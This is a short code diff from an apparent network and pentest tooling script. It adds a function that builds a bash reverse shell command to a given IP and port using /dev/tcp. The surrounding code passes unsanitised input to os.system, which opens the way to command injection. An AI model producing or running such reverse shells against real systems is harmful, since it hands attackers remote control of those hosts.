@@ -78,6 +78,10 @@ def network_iface_list():
 def network_sniffer(network, filter_statement):
     os.system("sudo python3 netplay.py " + network + filter_statement)
 
+def reverse_shell_gen(ip, port):
+    cmd = ""
+    cmd = f"/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1"
+    return cmd
 
 def verify_docker_installation() -> bool:
     result = subprocess.Popen(["docker", "-v"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
